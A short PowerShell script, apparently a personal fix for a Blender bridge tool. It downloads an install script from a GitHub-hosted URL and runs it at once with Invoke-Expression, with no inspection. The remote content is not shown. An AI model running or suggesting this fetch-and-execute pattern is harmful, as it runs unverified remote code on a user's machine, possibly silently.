# Repair Katherine's Blender bridge using the silent pythonw supervisor.
$ErrorActionPreference = 'Stop'
$installer = Invoke-RestMethod 'https://raw.githubusercontent.com/sapphiremaid/sapphiremaid.github.io/main/blender-bridge/install.ps1'
Invoke-Expression $installer
